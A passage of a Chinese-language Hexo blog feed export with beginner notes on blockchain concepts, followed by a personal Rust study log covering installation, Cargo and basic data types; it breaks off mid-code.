title="区块"></a>区块</h2><p>每个区块都存储广播数据</p><p>区块链就是每个区块连起来形成一个链条</p><h2 id="特点：去中心化"><a href="#特点：去中心化" class="headerlink" title="特点：去中心化"></a>特点：去中心化</h2><p>中心化是什么？</p><p>把中心化去掉，让全网人人参与，数据维护</p><h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>人人都参与记账的大账本，拆分到每个人的小账本</p><p>大部份的人认为真是可靠的时候，就可以确认这个区块</p><p>大家共同记账-互相验证-大家确认</p><h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><p>是一种奖励行为，</p><p>鼓励大家共同维护全网数据–&gt;也就是区块链数据</p><p>能把数据处理的最快最好，谁就可以获得btc奖励</p><h3 id="挖矿原理"><a href="#挖矿原理" class="headerlink" title="挖矿原理"></a>挖矿原理</h3><p>矿工那么多，取谁的呢？所有参与的矿工打包的数据必须加入一个<strong>哈希值</strong>，这个哈希值必须满足一定的条件，谁能先计算出这个哈希值并且广播给其他的矿工确认，且大部份的人认为没问题，谁就可以获得记录数据的权利以及大部份区块链给的奖励</p><p>同理，矿工挖矿不仅仅是为了得到比特币奖励，因为这是维护整个网络的重要环节。</p><p>挖矿的人越多，参与数据确认的人就越多，我们的数据也就越安全</p><h1 id="分叉"><a href="#分叉" class="headerlink" title="分叉"></a>分叉</h1><p>分叉其实是升级，当版本升级的时候，会有两个分叉，一个老的一个新的，老链上的矿工完成升级切换到新链后，这就叫做<strong>软分叉</strong>，当矿工不能达成共识的时候，就会分成了2条链，大家互不兼容各自玩各自的，这就叫做<strong>硬分叉</strong></p><p>想象一下，你造链一条链。现在矿工们把你的链升级了，然后联合起来达成共识要往他们升级的方向去走，那你的链还是你的吗？</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>公有链：公平公正公开，</p><p>私有链：个人或者公司的内部使用的链，外面的人不可以参与到链的共识，</p><p>联盟链：多企业联合，企业或组织方面的应用</p><h1 id="核心技术"><a href="#核心技术" class="headerlink" title="核心技术"></a>核心技术</h1><p>密码学、分布式存储、智能合约、共识算法</p><p>分布式存储：</p><h1 id="交易所"><a href="#交易所" class="headerlink" title="交易所"></a>交易所</h1><p>币安、 </p><p>okx、</p><p>Gateio  bitget wallet  </p><p>coinbase  </p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rust学习记录</title>
    <link href="/2024/05/11/rust%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/05/11/rust%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="记录一下Rust的学习历程"><a href="#记录一下Rust的学习历程" class="headerlink" title="记录一下Rust的学习历程"></a>记录一下Rust的学习历程</h1><h1 id="第一章：安装和hello-world"><a href="#第一章：安装和hello-world" class="headerlink" title="第一章：安装和hello world"></a>第一章：安装和hello world</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl https://sh.rustup.rs -sSf | sh</span><br></code></pre></td></tr></table></figure><p>这条命令会下载并执行一个脚本来安装rustup工具，进而安装最新的Rust稳定版本。该脚本可能会在执行过程中请求输入你的密码。一旦安装成功，你将能够看到如下所示的输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Rust is installed now. Great!<br></code></pre></td></tr></table></figure><p>上面的安装过程会自动将Rust工具链添加到环境变量PATH中，并在下一次登录终端时生效。假如你想要立即开始使用Rust而不用重新启动终端，那么你可以在终端中运行如下所示的命令来让配置立即生效：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">source</span> <span class="hljs-variable">$HOME</span>/.cargo/env</span><br></code></pre></td></tr></table></figure><p>或者，你也可以向～&#x2F;.bash_profile 文件中添加下面的语句，手动将Rust添加到环境变量PATH中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.cargo/bin:<span class="hljs-variable">$PATH</span></span></span><br></code></pre></td></tr></table></figure><h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello , world"></a>Hello , world</h2><p>创建一个文件夹</p><p>先，我们需要创建一个文件夹来存储编写的Rust代码。通常而言，Rust不会限制我们存储代码的位置，但是针对本书中的各种练习和项目，我们建议你创建一个可以集合所有项目的根文件夹，然后将本书中所有的项目放在里面。</p><p>现在，你可以打开终端并输入相应命令，来创建我们的文件夹及第一个“Hello, world!”项目了。</p><p>对于Linux系统、macOS系统，以及Windows系统的PowerShell终端来说，输入的命令如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> ～/projects</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ～/projects</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> hello_world</span><br>Hello, World!<br>现在，你应该已经成功安装好了Rust。让我们遵从传统，从编写一个可以打印出“Hello, world!”的小程序开始正式的学习旅程。<br><br>注意<br>本书假定你已经熟悉了基本的终端操作与常用命令。开发Rust程序并不会对你所使用的编辑工具有任何的要求，如果你喜欢使用某个IDE（Integrated Development Environment，集成开发环境），那么就用你喜欢的IDE好了。许多常用的IDE都已经针对Rust实现了某种程度上的支持，你可以通过相应的IDE文档来了解更多的细节。值得高兴的是，Rust开发团队在集中精力提供流畅、舒适的IDE支持，不断优化编码体验！<br><br>创建一个文件夹<br>首先，我们需要创建一个文件夹来存储编写的Rust代码。通常而言，Rust不会限制我们存储代码的位置，但是针对本书中的各种练习和项目，我们建议你创建一个可以集合所有项目的根文件夹，然后将本书中所有的项目放在里面。<br><br>现在，你可以打开终端并输入相应命令，来创建我们的文件夹及第一个“Hello, world!”项目了。<br><br>对于Linux系统、macOS系统，以及Windows系统的PowerShell终端来说，输入的命令如下所示：<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> ～/projects</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ～/projects</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> hello_world</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> hello_world</span><br><br>对于Windows系统的CMD终端，输入的命令如下所示：<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> <span class="hljs-string">&quot;%USERPROFILE%\projects&quot;</span></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-built_in">cd</span> /d <span class="hljs-string">&quot;%USERPROFILE%\projects&quot;</span></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> hello_world</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-built_in">cd</span> hello_world</span><br></code></pre></td></tr></table></figure><p>现在，你可以打开刚刚创建的<em>main.rs</em> 文件，并键入示例1-1中的代码。</p><p>main.rs</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello, world!&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 这部分代码定义了Rust中的一个函数。这里的main函数会比较特殊：当你运行一个可执行Rust程序的时候，所有的代码都会从这个入口函数开始运行。这段代码的第一行声明了一个名为main的、没有任何参数和返回值的函数。如果某天你需要给函数声明参数的话，那么就必须把它们放置在圆括号()中。</span><br><span class="hljs-comment">// 首先，标准Rust风格使用4个空格而不是Tab来实现缩进</span><br><span class="hljs-comment">// 最后，我们使用了一个分号（;　）作为这一行的结尾，它表明当前的表达式已经结束，而下一个表达式将要开始。大部分的Rust代码行都会以分号来结尾。</span><br></code></pre></td></tr></table></figure><h3 id="编译与运行是两个不同的步骤"><a href="#编译与运行是两个不同的步骤" class="headerlink" title="编译与运行是两个不同的步骤"></a>编译与运行是两个不同的步骤</h3><p>你应该已经运行过刚刚编写的程序了，让我们来详细地讨论一下这个过程中的每一个步骤。</p><p>在运行一段Rust程序之前，你必须输入rustc命令及附带的源文件名参数来编译它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">rustc main.rs</span><br></code></pre></td></tr></table></figure><p>编译完之后我们ls看一下编译出来了什么东西</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">main.exe # Windows系统下的main.exe<br>main.pdb # 如果你使用的是Windows系统，那么你还会看到一个附带调试信息、以.pdb 为后缀的文件<br>main.rs # 以.rs 为后缀的源代码文件<br></code></pre></td></tr></table></figure><p>假如你更加熟悉某种类似于Ruby、Python或JavaScript之类的动态语言，你可能还不太习惯在运行之前需要先进行编译。Rust是一种预编译语言，这意味着当你编译完Rust程序之后，便可以将可执行文件交付于其他人，并运行在没有安装Rust的环境中。而如果你交付给其他人的是一份.rb 、.py 或.js 文件，那么他们就必须要拥有对应的Ruby、Python或JavaScript实现来执行程序。当然，这些语言只需要用简单的一句命令就可以完成程序的编译和运行。这也算是语言设计上的权衡与取舍吧</p><h2 id="hello-cargo"><a href="#hello-cargo" class="headerlink" title="hello cargo"></a>hello cargo</h2><p>是啥：</p><p>是Rust的包管理器，它可以处理众多诸如构建代码、下载编译依赖库等琐碎但重要的任务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cargo --version</span><br>cargo 1.77.2 (e52e36006 2024-03-26)<br></code></pre></td></tr></table></figure><p>使用Cargo创建一个项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cargo new hello_cargo</span><br></code></pre></td></tr></table></figure><p>现在，让我们进入<em>hello_cargo</em> 文件夹，你可以看到Cargo刚刚生成的两个文件与一个目录：一个名为<em>Cargo.toml</em> 的文件，以及一个名为<em>main.rs</em> 的源代码文件，该源代码文件被放置在<em>src</em> 目录下。与此同时，Cargo还会初始化一个新的Git仓库并生成默认的.<em>gitignore</em> 文件。</p><p><em>Cargo.toml</em> 中的内容如示例1-2所示，你可以使用文本编辑器打开它。</p><p>toml就是配置文件格式</p><p>Cargo.toml</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[package]</span> <span class="hljs-comment"># 首行文本中的[package]是一个区域标签，它表明接下来的语句会被用于配置当前的程序包。随着我们在这个文件中增加更多的信息，你还会见识到更多其他的区域 （section）</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;hello_cargo&quot;</span> <span class="hljs-comment"># 项目名称</span><br><span class="hljs-attr">version</span> = <span class="hljs-string">&quot;0.1.0&quot;</span> <span class="hljs-comment"># 版本</span><br><span class="hljs-attr">edition</span> = <span class="hljs-string">&quot;2021&quot;</span> <span class="hljs-comment"># 日期</span><br><br><span class="hljs-comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><br><span class="hljs-section">[dependencies]</span><br></code></pre></td></tr></table></figure><p>同样按照惯例，Cargo会默认把所有的源代码文件保存到src 目录下，而项目根目录只被用来存放诸如README文档、许可声明、配置文件等与源代码无关的文件。使用Cargo可以帮助你合理并一致地组织自己的项目文件，从而使一切井井有条。</p><h3 id="使用Cargo构建和运行项目"><a href="#使用Cargo构建和运行项目" class="headerlink" title="使用Cargo构建和运行项目"></a>使用Cargo构建和运行项目</h3><p>那么使用Cargo来构建和运行项目与手动使用rustc相比又有哪些异同呢？在当前的<em>hello_cargo</em> 项目目录下，Cargo可以通过下面的命令来完成构建任务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cargo build</span><br>   Compiling hello_cargo v0.1.0 (file:///projects/hello_cargo)<br>    Finished dev [unoptimized + debuginfo] target(s) in 2.85 secs<br></code></pre></td></tr></table></figure><p>与之前不同，这个命令会将可执行程序生成在路径<em>target&#x2F;debug&#x2F;hello_ cargo</em> （或者Windows系统下的<em>target\debug\hello_cargo.exe</em> ）下。你可以通过如下所示的命令运行这个可执行程序试试看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./target/debug/hello_cargo <span class="hljs-comment"># or .\target\debug\hello_cargo.exe on Windows</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果是linux就直接运行这个二进制，如果是win就运行exe</span><br>Hello, world!<br></code></pre></td></tr></table></figure><p>一切正常的话，Hello, world! 应该能够被打印到终端上。首次使用命令cargo build构建的时候，它还会在项目根目录下创建一个名为Cargo.lock 的新文件，这个文件记录了当前项目所有依赖库的具体版本号。由于当前的项目不存在任何依赖，所以这个文件中还没有太多东西。你最好不要手动编辑其中的内容，Cargo可以帮助你自动维护它。</p><p>当然，也可以简单的使用cargo run 命令来一次完成编译和运行任务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cargo run</span><br>    Finished dev [unoptimized + debuginfo] target(s) in 0.02s<br>     Running `target/debug/hello_cargo`<br>Hello, world!<br></code></pre></td></tr></table></figure><p>这里没有看到编译hello_cargo的相关信息，因为cargo发现源码并没有被修改，所以就直接运行了所生成的二进制，我们现在修改一下源代码再试试run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cargo run</span><br>   Compiling hello_cargo v0.1.0 (/home/wang/code/rustStudy/hello/hello_cargo)<br>    Finished dev [unoptimized + debuginfo] target(s) in 0.13s # 这里就是在重新编译<br>     Running `target/debug/hello_cargo`<br>Hello, world!, test cargo run<br></code></pre></td></tr></table></figure><p>还有一个命令，cargo check ，这个命令可以快速检查当前的代码是否可以通过编译，而不需要花费EAI的时间去真正生成可执行程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cargo check</span><br>    Finished dev [unoptimized + debuginfo] target(s) in 0.00s<br></code></pre></td></tr></table></figure><p>总结：</p><p>cargo new project_name 创建一个Cargo项目目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">src --放项目代码的 source 的缩写<br>target --目标，也就是放构建完的东西的目录<br>Cargo.lock 这个文件记录了当前项目所有依赖库的具体版本号<br>Cargo.toml 存放Cargo的配置信息，<br>.gitignore git配置信息，这个里面目前的内容是/target，表示target这个目录不会上传到git上去<br></code></pre></td></tr></table></figure><p>通过cargo build 和cargo check 来构建一个项目</p><p>通过cargo run 来构建并且运行这个项目，</p><p>构建所产生的结果会被Cargo 存储在<em>target&#x2F;debug</em>目录下面，而非代码所处在的位置，</p><p>Cargo另一个优势是不区分操作系统（Linux\MacOS\Windows），在任何操作系统下都是一样的命令</p><h3 id="以Release模式进行构建"><a href="#以Release模式进行构建" class="headerlink" title="以Release模式进行构建"></a>以Release模式进行构建</h3><p>当准备好发布自己的项目时，你可以使用命令cargo build –release在优化模式下构建并生成可执行程序。它生成的可执行文件会被放置在<em>target&#x2F;release</em> 目录下，而不是之前的<em>target&#x2F;debug</em> 目录下。这种模式会以更长的编译时间为代价来优化代码，从而使代码拥有更好的运行时性能。</p><h1 id="第二章-编写一个猜数游戏"><a href="#第二章-编写一个猜数游戏" class="headerlink" title="第二章 编写一个猜数游戏"></a>第二章 编写一个猜数游戏</h1><h1 id="第三章-通用编程概念"><a href="#第三章-通用编程概念" class="headerlink" title="第三章 通用编程概念"></a>第三章 通用编程概念</h1><p>src&#x2F;main.rs</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::io;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Guess the number!&quot;</span>);<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Please input your guess.&quot;</span>);<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">guess</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>();<br><br>    io::<span class="hljs-title function_ invoke__">stdin</span>().<span class="hljs-title function_ invoke__">read_line</span>(&amp;<span class="hljs-keyword">mut</span> guess)<br>        .<span class="hljs-title function_ invoke__">expect</span>(<span class="hljs-string">&quot;Failed to read line&quot;</span>);<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="变量与可变性："><a href="#变量与可变性：" class="headerlink" title="变量与可变性："></a>变量与可变性：</h3><p>Rust中的变量默认是不可变的。Rust语言提供这一概念是为了能够让你安全且方便地写出复杂、甚至是并行的代码。</p><p>代码：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Hello, world!, test cargo run&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = <span class="hljs-number">5</span>; <span class="hljs-comment">// 如果要对变量进行二次赋值，就要使用let mut x = 5;</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;x is &#123;&#125;&quot;</span>,x);<br>    x = <span class="hljs-number">6</span>;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;x is &#123;&#125;&quot;</span>,x);<br>&#125;<br><span class="hljs-comment">// 这里运行会报错，看报错提示</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">$ cargo run</span><br><span class="hljs-comment">   Compiling hello_cargo v0.1.0 (/home/wang/code/rustStudy/hello/hello_cargo)</span><br><span class="hljs-comment">error[E0384]: cannot assign twice to immutable variable `x`</span><br><span class="hljs-comment"> --&gt; src/main.rs:5:5</span><br><span class="hljs-comment">  |</span><br><span class="hljs-comment">3 |     let x = 5;</span><br><span class="hljs-comment">  |         -</span><br><span class="hljs-comment">  |         |</span><br><span class="hljs-comment">  |         first assignment to `x`  第一个任务x</span><br><span class="hljs-comment">  |         help: consider making this binding mutable: `mut x` x是一个不变的类型</span><br><span class="hljs-comment">4 |     println!(&quot;x is &#123;&#125;&quot;,x);</span><br><span class="hljs-comment">5 |     x = 6;</span><br><span class="hljs-comment">  |     ^^^^^ cannot assign twice to immutable variable 不可以对不变类型变量进行二次赋值</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">For more information about this error, try `rustc --explain E0384`.</span><br><span class="hljs-comment">error: could not compile `hello_cargo` (bin &quot;hello_cargo&quot;) due to 1 previous error</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>如果需要定义可变变量，就必须<code>let mut x = 5;</code></p><p>除了避免出现bug，设计一个变量的可变性还需要考量许多因素。例如当你在使用某些重型数据结构时，适当地使用可变性去修改一个实例，可能比赋值和重新返回一个新分配的实例要更有效率；而当数据结构较为轻量的时候，采用更偏向函数式的风格，通过创建新变量来进行赋值，可能会使代码更加易于理解。在类似这样的情形下，为了可读性而损失少许的性能也许是值得的。</p><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>与不可变变量类似，<strong>常量</strong>（constant）是绑定到一个常量名且不允许更改的值，但是常量和变量之间是有差异的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![allow(unused)]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">const</span> THREE_HOURS_IN_SECONDS: <span class="hljs-type">u32</span> = <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="遮蔽"><a href="#遮蔽" class="headerlink" title="遮蔽"></a>遮蔽</h3><p>你可以声明和前面变量具有相同名称的新变量。这个是第一个变量被第二个变量<strong>遮蔽</strong>（<em>shadow</em>）</p><p>遮蔽和将变量标记为 <code>mut</code> 的方式不同，因为除非我们再次使用 <code>let</code> 关键字，否则若是我们不小心尝试重新赋值给这个变量，我们将得到一个编译错误。通过使用 <code>let</code>，我们可以对一个值进行一些转换，但在这些转换完成后，变量将是不可变的。</p><p><code>mut</code> 和遮蔽之间的另一个区别是，因为我们在再次使用 <code>let</code> 关键字时有效地创建了一个新的变量，所以我们可以改变值的类型，但重复使用相同的名称。例如，假设我们程序要求用户输入空格字符来显示他们想要的空格数目，但我们实际上想要将该输入存储为一个数字：</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>Rust是一种静态类型（statically typed）的语言，意味着它必须在编译期间就要知道所有变量的类型，、</p><h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p>表 3-1: Rust 中的整型</p><table><thead><tr><th>长度</th><th>有符号类型</th><th>无符号类型</th></tr></thead><tbody><tr><td>8 位</td><td><code>i8</code></td><td><code>u8</code></td></tr><tr><td>16 位</td><td><code>i16</code></td><td><code>u16</code></td></tr><tr><td>32 位</td><td><code>i32</code></td><td><code>u32</code></td></tr><tr><td>64 位</td><td><code>i64</code></td><td><code>u64</code></td></tr><tr><td>128 位</td><td><code>i128</code></td><td><code>u128</code></td></tr><tr><td>arch</td><td><code>isize</code></td><td><code>usize</code></td></tr></tbody></table><p><strong>有符号</strong>和<strong>无符号</strong>表示数字能否取负数</p><p>每个有符号类型规定的数字范围是 -(2^(n - 1) ~ 2^(n - 1) - 1，其中 <code>n</code> 是该定义形式的位长度。所以 <code>i8</code> 可存储数字范围是 -(2^7) ~ 2^7 - 1，即 -128 ~ 127。</p><p>无符号类型可以存储的数字范围是 0 ~( 2^n )- 1，所以 <code>u8</code> 能够存储的数字为 0 ~ 2^(8 - 1)，即 0 ~ 255。</p><p>此外，<code>isize</code> 和 <code>usize</code> 类型取决于程序运行的计算机体系结构，在表中表示为“arch”：若使用 64 位架构系统则为 64 位，若使用 32 位架构系统则为 32 位。</p><p>注意，可能属于多种数字类型的数字字面量允许使用类型后缀来指定类型，例如 <code>57u8</code>。数字字面量还可以使用 <code>_</code> 作为可视分隔符以方便读数，如 <code>1_000</code>，此值和 <code>1000</code> 相同。</p><p>表 3-2: Rust 的整型字面量</p><table><thead><tr><th>数字字面量</th><th>示例</th></tr></thead><tbody><tr><td>十进制</td><td><code>98_222</code></td></tr><tr><td>十六进制</td><td><code>0xff</code></td></tr><tr><td>八进制</td><td><code>0o77</code></td></tr><tr><td>二进制</td><td><code>0b1111_0000</code></td></tr><tr><td>字节 (仅限于 <code>u8</code>)</td><td><code>b&#39;A&#39;</code></td></tr></tbody></table><p>那么该使用哪种类型的整型呢？如果不确定，Rust 的默认形式通常是个不错的选择，整型默认是 <code>i32</code>。<code>isize</code> 和 <code>usize</code> 的主要应用场景是用作某些集合的索引。</p><p>i32 就是 -2^31~2^31-1</p><h3 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h3><p>比方说有一个<code>u8</code> ,存放区间是什么？是0<del>(2^8)-1&#x3D;0</del>255</p><p>如果当你将其修改为范围之外的值，比如说256，则会发生<strong>整型溢出（integer overflow）</strong>,这会导致两种行为的其中一种：</p><p>1、当在调试（debug）模式编译时，Rust 会检查整型溢出，若存在这些问题则使程序在编译时 <em>panic</em>。Rust 使用 panic 这个术语来表明程序因错误而退出。第 9 章 [“<code>panic!</code> 与不可恢复的错误”](file:&#x2F;&#x2F;&#x2F;opt&#x2F;Koodo Reader&#x2F;resources&#x2F;app.asar&#x2F;build&#x2F;ch09-01-unrecoverable-errors-with-panic.xhtml)会详细介绍 panic。</p><p>2、在当使用 <code>--release</code> 参数进行发布（release）模式构建时，Rust <strong>不</strong>检测会导致 panic 的整型溢出。相反当检测到整型溢出时，Rust 会进行一种被称为二进制补码包裹（<em>two’s complement wrapping</em>）的操作。简而言之，大于该类型最大值的数值会被“包裹”成该类型能够支持的对应数字的最小值。比如在 <code>u8</code> 的情况下，256 变成 0，257 变成 1，依此类推。程序不会 panic，但是该变量的值可能不是你期望的值。依赖整型溢出包裹的行为不是一种正确的做法。</p><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><p>浮点数是带有小数点的数字，Rust中有两种：</p><p><code>f32</code>类型是单精度浮点型</p><p><code>f64</code>为双精度浮点型。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = <span class="hljs-number">2.0</span>; <span class="hljs-comment">// f64</span><br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span>: <span class="hljs-type">f32</span> = <span class="hljs-number">3.0</span>; <span 